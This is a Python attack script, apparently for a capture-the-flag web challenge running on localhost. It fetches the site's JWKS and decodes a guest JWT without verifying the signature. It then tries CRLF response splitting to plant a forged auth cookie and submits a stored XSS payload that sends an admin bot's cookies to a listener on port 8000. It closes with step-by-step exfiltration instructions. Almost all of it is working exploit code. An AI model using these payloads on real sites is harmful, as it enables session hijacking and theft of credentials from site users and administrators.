import jwt
import requests
import json

# Step 1: Get the legitimate JWKS from the application
response = requests.get('http://localhost:1337/.well-known/jwks.json')
legitimate_jwks = response.json()
kid = legitimate_jwks['keys'][0]['kid']

print(f"[+] Retrieved JWKS: {json.dumps(legitimate_jwks, indent=2)}")
print(f"[+] Kid: {kid}")

# Step 2: The vulnerability is that we can control the jku parameter
# and the application will fetch from our controlled server.
# But since we can't reach the docker container from outside with @bypass,
# let's try a different approach using the CSP injection

# Step 3: Let's first try to get a guest session
print("\n[+] Getting guest session...")
response = requests.get('http://localhost:1337/', allow_redirects=True)
print(f"Status: {response.status_code}")
if 'auth' in response.cookies:
    guest_token = response.cookies['auth']
    print(f"Guest token: {guest_token[:50]}...")
    
    # Decode the guest token to see its structure
    try:
        # Don't verify signature for now
        decoded = jwt.decode(guest_token, options={"verify_signature": False})
        print(f"Decoded guest token: {json.dumps(decoded, indent=2)}")
    except Exception as e:
        print(f"Error decoding: {e}")

# Step 4: Try the Response Splitting attack via error_path
print("\n[+] Testing Response Splitting via error_path...")
# The error_path parameter is reflected in the response
# Let's try CRLF injection
malicious_path = "/test%0d%0aSet-Cookie:%20auth=<forged_jwt>"
response = requests.get(f'http://localhost:1337/?error_path={malicious_path}')
print(f"Status: {response.status_code}")
print(f"Headers: {dict(response.headers)}")
print(f"Body preview: {response.text[:200]}")

# Step 5: Try to submit a presentation idea to inject into bot's page
print("\n[+] Submitting malicious presentation...")
session = requests.Session()
# Get a session first
r = session.get('http://localhost:1337/')
print(f"Got session cookie: {'auth' in session.cookies}")

# Submit a presentation with XSS payload
xss_payload = "<script>fetch('http://host.docker.internal:8000?data='+encodeURIComponent(document.cookie))</script>"
r = session.post('http://localhost:1337/', data={'idea': xss_payload})
print(f"Submission status: {r.status_code}")

print("\n[+] Checking if submission was stored...")
# We can't access /api/list from outside since it requires IP check
# But the bot will see our submission when it visits /list

print("""
[*] Attack strategy:
1. We submitted an XSS payload in the presentation idea
2. The bot visits /list every ~35 seconds with admin privileges
3. The bot's browser will execute our JavaScript
4. Our JS can exfiltrate the admin's token or directly access /api/list
5. Start a listener on port 8000 to receive the exfiltrated data

Next steps:
- Start HTTP server on port 8000 to receive stolen data
- Wait for bot to visit /list
- Bot will execute our XSS and send data to our server
""")
